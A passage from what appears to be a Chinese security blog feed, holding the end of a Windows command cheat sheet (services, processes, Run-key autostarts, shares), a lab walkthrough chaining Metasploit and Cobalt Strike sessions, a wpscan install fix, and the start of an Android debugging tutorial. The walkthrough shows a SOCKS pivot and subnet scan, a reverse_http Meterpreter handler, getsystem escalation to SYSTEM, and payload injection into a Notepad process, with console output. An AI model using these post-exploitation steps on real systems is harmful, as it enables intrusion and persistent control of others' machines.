type&#x3D; service</td><td>查看所有服务的服务</td></tr><tr><td>sc query &lt;服务名&gt;</td><td>查看某个服务</td></tr><tr><td>sc stop &lt;服务名&gt;</td><td>关闭某个服务</td></tr><tr><td>sc start &lt;服务名&gt;</td><td>开启某个服务</td></tr><tr><td>sc pause &lt;服务名&gt;</td><td>暂停某个服务</td></tr><tr><td>sc pause &lt;服务名&gt;</td><td>暂停某个服务</td></tr><tr><td>sc delete &lt;服务名&gt;</td><td>删除某个服务</td></tr><tr><td>sc create &lt;服务名&gt; binPath&#x3D; &lt;路径&gt;</td><td>创建一个服务</td></tr><tr><td>sc create &lt;服务名&gt; binPath&#x3D; &lt;路径&gt; start&#x3D; auto</td><td>创建一个自启动的服务</td></tr><tr><td>sc config &lt;服务名&gt; binPath&#x3D; &lt;路径&gt;</td><td>修改某个服务</td></tr><tr><td>sc config &lt;服务名&gt; binPath&#x3D; &lt;路径&gt; start&#x3D; auto</td><td>修改某个服务手动启动</td></tr><tr><td>sc description &lt;描述&gt;</td><td>修改某个服务的描述</td></tr></tbody></table><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>tasklist</td><td>查看所有进程</td></tr><tr><td>tasklist &#x2F;v</td><td>查看所有进程</td></tr><tr><td>tasklist &#x2F;fi “USERNAME ne NT AUTHORITY\SYSTEM” &#x2F;fi “STATUS eq running”</td><td>查看所有正在运行系统进程</td></tr><tr><td>tasklist &#x2F;v &#x2F;fi “STATUS eq running”</td><td>查看所有正在运行进程</td></tr><tr><td>taskkill &#x2F;pid &lt;进程pid&gt;</td><td>结束进程</td></tr><tr><td>taskkill &#x2F;t &#x2F;pid &lt;进程pid&gt;</td><td>结束进程并结束子进程</td></tr><tr><td>taskkill &#x2F;f &#x2F;pid &lt;进程pid&gt;</td><td>强制结束进程</td></tr><tr><td>taskkill &#x2F;pid 2134 &#x2F;t &#x2F;fi “username eq administrator”</td><td>结束管理员帐户启动的进程</td></tr></tbody></table><h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>wmic startup</td><td>查看启动项</td></tr><tr><td>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</td><td>查看启动项</td></tr><tr><td>reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &lt;启动项名称&gt; &#x2F;t REG_SZ &#x2F;d &lt;新注册表项的数据&gt; &#x2F;f</td><td>添加或修改启动项</td></tr><tr><td>reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &lt;启动项名称&gt; &#x2F;f</td><td>删除启动项</td></tr></tbody></table><h2 id="共享资源"><a href="#共享资源" class="headerlink" title="共享资源"></a>共享资源</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>net share</td><td>查看所有共享资源</td></tr><tr><td>net share &lt;共享名&gt;&#x3D;&lt;盘符&gt;:&lt;路径&gt;</td><td>创建一个共享资源</td></tr><tr><td>net share &lt;共享名&gt;&#x3D;&lt;盘符&gt;:&lt;路径&gt; &#x2F;grant:&lt;用户名&gt;,full</td><td>创建一个所有权限的共享资源</td></tr><tr><td>net share &lt;共享名&gt;&#x3D;&lt;盘符&gt;:&lt;路径&gt; &#x2F;remark:&lt;共享资源描述&gt;</td><td>创建一个带有描述的共享资源</td></tr><tr><td>net share &lt;共享名&gt;</td><td>查看某个共享资源</td></tr><tr><td>net share &lt;共享名&gt; &#x2F;delete</td><td>删除某个共享资源</td></tr><tr><td>net use</td><td>查看所有共享资源连接</td></tr><tr><td>net use \<IP>&lt;共享名&gt;</td><td>连接某个共享资源</td></tr><tr><td>net use &lt;盘符&gt;: \<IP>&lt;共享名&gt;</td><td>连接某个共享资源成功后挂载到某个盘符</td></tr><tr><td>net use \<IP>&lt;共享名&gt; &#x2F;delete</td><td>删除某个连接成功共享资源</td></tr><tr><td>net use &lt;盘符&gt;: \<IP>&lt;共享名&gt; &#x2F;delete</td><td>删除某个有挂载盘符的共享资源</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;防火墙&quot;&gt;&lt;a href=&quot;#防火墙&quot; class=&quot;headerlink&quot; title=&quot;防火墙&quot;&gt;&lt;/a&gt;防火墙&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;t</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>metasploit和CobaltStrike联动</title>
    <link href="http://webb-l.top/2022/04/25/tools/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/"/>
    <id>http://webb-l.top/2022/04/25/tools/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/</id>
    <published>2022-04-24T16:00:00.000Z</published>
    <updated>2022-04-25T07:25:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-环境"><a href="#0-环境" class="headerlink" title="0.环境"></a>0.环境</h2><table><thead><tr><th>名称</th><th>IP</th></tr></thead><tbody><tr><td>metasploit</td><td>192.168.1.100</td></tr><tr><td>靶机</td><td>192.168.1.101</td></tr><tr><td></td><td>192.168.100.155</td></tr><tr><td>CobaltStrike</td><td>192.168.1.103</td></tr></tbody></table><h2 id="1-CobaltStrike会话传递给metasploit。"><a href="#1-CobaltStrike会话传递给metasploit。" class="headerlink" title="1 CobaltStrike会话传递给metasploit。"></a>1 CobaltStrike会话传递给metasploit。</h2><h3 id="1-1-使用CobaltStrike的Socks代理"><a href="#1-1-使用CobaltStrike的Socks代理" class="headerlink" title="1.1 使用CobaltStrike的Socks代理"></a>1.1 使用CobaltStrike的Socks代理</h3><ul><li><p>先使用CobaltStrike生产一个反弹shell。</p></li><li><p>等待连接完成已经按照下图步骤开启Socks代理。</p></li></ul><p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_10-58-05.png" alt="截图_2022-04-25_10-58-05.png"></p><ul><li>设置Socks端口这里我使用默认。</li></ul><p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_11-02-40.png" alt="截图_2022-04-25_11-02-40.png"></p><ul><li>代理开启成功。</li></ul><p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_11-03-59.png" alt="截图_2022-04-25_11-03-59.png"></p><ul><li>获取metasploit代理配置。</li></ul><p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_11-11-26.png" alt="截图_2022-04-25_11-11-26.png"></p><ul><li>复制代理配置。</li></ul><p><img src="/../../images/.config/marktext/images/2022-04-25-11-15-04-image.png" alt="2022-04-25-11-15-04-image.png"></p><ul><li>在metasploit输入代理配置信息之后就可以通过CobaltStrike代理使用metasploit的功能。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; setg Proxies socks4:192.168.1.103:14265</span><br><span class="line">Proxies =&gt; socks4:192.168.1.103:14265</span><br></pre></td></tr></table></figure><ul><li>使用metasploit的端口扫描。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/portscan/tcp </span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="built_in">set</span> rhosts 192.168.100.1/24</span><br><span class="line">rhosts =&gt; 192.168.100.1/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="built_in">set</span> ports 80,888,8080,8888</span><br><span class="line">ports =&gt; 80,888,8080,8888</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="built_in">set</span> threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; exploit </span><br><span class="line">[*] 192.168.100.1/24:     - Scanned  36 of 256 hosts (14% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned  57 of 256 hosts (22% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned  80 of 256 hosts (31% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 118 of 256 hosts (46% complete)</span><br><span class="line">[+] 192.168.100.131:      - 192.168.100.131:8888 - TCP OPEN</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 140 of 256 hosts (54% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 160 of 256 hosts (62% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 180 of 256 hosts (70% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 217 of 256 hosts (84% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 239 of 256 hosts (93% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h3 id="1-2-将CobaltStrike的会话传递到metasploit。"><a href="#1-2-将CobaltStrike的会话传递到metasploit。" class="headerlink" title="1.2 将CobaltStrike的会话传递到metasploit。"></a>1.2 将CobaltStrike的会话传递到metasploit。</h3><ul><li>msf配置监听器。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.100</span><br><span class="line">lhost =&gt; 192.168.1.100</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line">[*] Started HTTP reverse handler on http://192.168.1.100:8080</span><br></pre></td></tr></table></figure><ul><li>选择监听器。</li></ul><p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_14-49-58.png" alt="截图_2022-04-25_14-49-58.png"></p><ul><li>创建一个Foreign HTTP监听器。这里的地址和端口是metasploit设置的信息。</li></ul><p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_15-00-12.png" alt="截图_2022-04-25_15-00-12.png"></p><ul><li>选择新建会话。</li></ul><p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_15-01-24.png" alt="截图_2022-04-25_15-01-24.png"></p><ul><li>选择刚才创建的监听器。</li></ul><p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_15-02-13.png" alt="截图_2022-04-25_15-02-13.png"></p><ul><li>会话传递成功。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started HTTP reverse handler on http://192.168.1.1008080</span><br><span class="line">[!] http://192.168.1.100:8080 handling request from 192.168.1.101; (UUID: 9c8ocpoi) Without a database connected that payload UUID tracking will not work!</span><br><span class="line">[*] http://192.168.1.100:8080 handling request from 192.168.1.101; (UUID: 9c8ocpoi) Staging x86 payload (176220 bytes) ...</span><br><span class="line">[!] http://192.168.1.100:8080 handling request from 192.168.1.101; (UUID: 9c8ocpoi) Without a database connected that payload UUID tracking will not work!</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.100:8080 -&gt; 127.0.0.1 ) at 2022-04-25 15:02:37 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-HHP4Q76IAO9\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h2 id="2-metasploit会话传递给CobaltStrike。"><a href="#2-metasploit会话传递给CobaltStrike。" class="headerlink" title="2 metasploit会话传递给CobaltStrike。"></a>2 metasploit会话传递给CobaltStrike。</h2><ul><li><p>这里我使用CobaltStrike刚才传递到metasploit会话，现在我把metasploit的会话传递回CobaltStrike。</p></li><li><p>使用metasploit中的<code>windows/local/payload_inject</code>模块。这里设置ip和端口是CobaltStrike的test监听器。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">bg</span></span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/payload_inject</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; <span class="built_in">set</span> lhost 192.168.1.103</span><br><span class="line">lhost =&gt; 192.168.1.103</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; <span class="built_in">set</span> lport 4096</span><br><span class="line">lport =&gt; 4096</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; exploit </span><br><span class="line"></span><br><span class="line">[-] Handler failed to <span class="built_in">bind</span> to 192.168.1.103:4096</span><br><span class="line">[*] Started HTTP reverse handler on http://0.0.0.0:4096</span><br><span class="line">[*] Running module against WIN-HHP4Q76IAO9</span><br><span class="line">[*] Spawned Notepad process 9580</span><br><span class="line">[*] Injecting payload into 9580</span><br><span class="line">[*] Preparing <span class="string">&#x27;windows/meterpreter/reverse_http&#x27;</span> <span class="keyword">for</span> PID 9580</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><ul><li>创建成功。</li></ul><p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_15-14-03.png" alt="截图_2022-04-25_15-14-03.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0-环境&quot;&gt;&lt;a href=&quot;#0-环境&quot; class=&quot;headerlink&quot; title=&quot;0.环境&quot;&gt;&lt;/a&gt;0.环境&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;名称&lt;/th&gt;
&lt;th&gt;IP&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbod</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>解决wpscan找不到webrick错误</title>
    <link href="http://webb-l.top/2022/04/15/wpscan/%E8%A7%A3%E5%86%B3wpscan%E6%89%BE%E4%B8%8D%E5%88%B0webrick%E9%94%99%E8%AF%AF/"/>
    <id>http://webb-l.top/2022/04/15/wpscan/%E8%A7%A3%E5%86%B3wpscan%E6%89%BE%E4%B8%8D%E5%88%B0webrick%E9%94%99%E8%AF%AF/</id>
    <published>2022-04-15T03:55:21.000Z</published>
    <updated>2022-04-15T03:55:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="错误信息："><a href="#错误信息：" class="headerlink" title="错误信息："></a>错误信息：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~]</span><br><span class="line">└─$ wpscan                                                                                                                                                                                                                             127 ⨯</span><br><span class="line">/usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1401:<span class="keyword">in</span> `rescue <span class="keyword">in</span> block <span class="keyword">in</span> activate_dependencies<span class="string">&#x27;: Could not find &#x27;</span>webrick<span class="string">&#x27; (&gt;= 0) among 222 total gem(s) (Gem::MissingSpecError)</span></span><br><span class="line"><span class="string">Checked in &#x27;</span>GEM_PATH=/home/webb/.local/share/gem/ruby/3.0.0:/var/lib/gems/3.0.0:/usr/local/lib/ruby/gems/3.0.0:/usr/lib/ruby/gems/3.0.0:/usr/lib/x86_64-linux-gnu/ruby/gems/3.0.0:/usr/share/rubygems-integration/3.0.0:/usr/share/rubygems-integration/all:/usr/lib/x86_64-linux-gnu/rubygems-integration/3.0.0<span class="string">&#x27; at: /usr/share/rubygems-integration/all/specifications/xmlrpc-0.3.2.gemspec, execute `gem env` for more information</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1398:in `block in activate_dependencies&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:<span class="keyword">in</span> `each<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:in `activate_dependencies&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1369:<span class="keyword">in</span> `activate<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1405:in `block in activate_dependencies&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:<span class="keyword">in</span> `each<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:in `activate_dependencies&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1369:<span class="keyword">in</span> `activate<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1405:in `block in activate_dependencies&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:<span class="keyword">in</span> `each<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:in `activate_dependencies&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1369:<span class="keyword">in</span> `activate<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems.rb:286:in `block in activate_bin_path&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems.rb:285:<span class="keyword">in</span> `synchronize<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems.rb:285:in `activate_bin_path&#x27;</span></span><br><span class="line">        from /usr/bin/wpscan:25:<span class="keyword">in</span> `&lt;main&gt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">/usr/lib/ruby/vendor_ruby/rubygems/dependency.rb:311:in `to_specs&#x27;</span>: Could not find <span class="string">&#x27;webrick&#x27;</span> (&gt;= 0) among 222 total gem(s) (Gem::MissingSpecError)</span><br><span class="line">Checked <span class="keyword">in</span> <span class="string">&#x27;GEM_PATH=/home/webb/.local/share/gem/ruby/3.0.0:/var/lib/gems/3.0.0:/usr/local/lib/ruby/gems/3.0.0:/usr/lib/ruby/gems/3.0.0:/usr/lib/x86_64-linux-gnu/ruby/gems/3.0.0:/usr/share/rubygems-integration/3.0.0:/usr/share/rubygems-integration/all:/usr/lib/x86_64-linux-gnu/rubygems-integration/3.0.0&#x27;</span> , execute `gem <span class="built_in">env</span>` <span class="keyword">for</span> more information</span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1399:<span class="keyword">in</span> `block <span class="keyword">in</span> activate_dependencies<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:in `each&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:<span class="keyword">in</span> `activate_dependencies<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1369:in `activate&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1405:<span class="keyword">in</span> `block <span class="keyword">in</span> activate_dependencies<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:in `each&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:<span class="keyword">in</span> `activate_dependencies<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1369:in `activate&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1405:<span class="keyword">in</span> `block <span class="keyword">in</span> activate_dependencies<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:in `each&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1387:<span class="keyword">in</span> `activate_dependencies<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems/specification.rb:1369:in `activate&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems.rb:286:<span class="keyword">in</span> `block <span class="keyword">in</span> activate_bin_path<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/lib/ruby/vendor_ruby/rubygems.rb:285:in `synchronize&#x27;</span></span><br><span class="line">        from /usr/lib/ruby/vendor_ruby/rubygems.rb:285:<span class="keyword">in</span> `activate_bin_path<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/bin/wpscan:25:in `&lt;main&gt;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>这里我们只需要找出关键信息然后再尝试解决即可。</p></li><li><p>从上面的内容我们可以看到“ Could not find ‘webrick’ (&gt;&#x3D; 0) among 222 total gem(s) (Gem::MissingSpecError)”这句话打开的意思是找不到<strong>webrick</strong>。</p></li></ul><h2 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h2><ul><li>使用<strong>gem</strong>安装<strong>webrick</strong>。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install webrick</span><br></pre></td></tr></table></figure><ul><li>再次运行<strong>wpscan</strong>。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~]</span><br><span class="line">└─$ wpscan                  </span><br><span class="line">One of the following options is required: --url, --update, --<span class="built_in">help</span>, --hh, --version</span><br><span class="line"></span><br><span class="line">Please use --<span class="built_in">help</span>/-h <span class="keyword">for</span> the list of available options.</span><br></pre></td></tr></table></figure><h2 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h2><ul><li><p><strong>gem</strong>是什么？</p><ul><li><strong>gem</strong>是<strong>Ruby</strong>模块的包管理器。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;错误信息：&quot;&gt;&lt;a href=&quot;#错误信息：&quot; class=&quot;headerlink&quot; title=&quot;错误信息：&quot;&gt;&lt;/a&gt;错误信息：&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;</summary>
      
    
    
    
    
    <category term="wpscan" scheme="http://webb-l.top/tags/wpscan/"/>
    
  </entry>
  
  <entry>
    <title>IntelliJ IDEA 动态调试Android应用</title>
    <link href="http://webb-l.top/2022/04/06/Android/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/"/>
    <id>http://webb-l.top/2022/04/06/Android/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/</id>
    <published>2022-04-06T10:55:52.000Z</published>
    <updated>2022-04-06T12:37:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="打开IntelliJ-IDEA"><a href="#打开IntelliJ-IDEA" class="headerlink" title="打开IntelliJ IDEA"></a>打开IntelliJ IDEA</h2><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-18-56-59-image.png"></p><h2 id="创建一个新项目"><a href="#创建一个新项目" class="headerlink" title="创建一个新项目"></a>创建一个新项目</h2><ul><li>点击下一步。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-18-57-38-image.png"></p><ul><li>点击完成。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-18-59-36-image.png"></p><h2 id="等待项目创建完成"><a href="#等待项目创建完成" class="headerlink" title="等待项目创建完成"></a>等待项目创建完成</h2><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-19-03-44-image.png"></p><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-19-04-43-image.png"></p><h2 id="写入一个简单的提示功能"><a href="#写入一个简单的提示功能" class="headerlink" title="写入一个简单的提示功能"></a>写入一个简单的提示功能</h2><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-19-06-21-image.png"></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle</span><br><span class="line"><span class="keyword">import</span> android.view.View</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> : <span class="type">AppCompatActivity</span></span>() &#123;</span><br><span 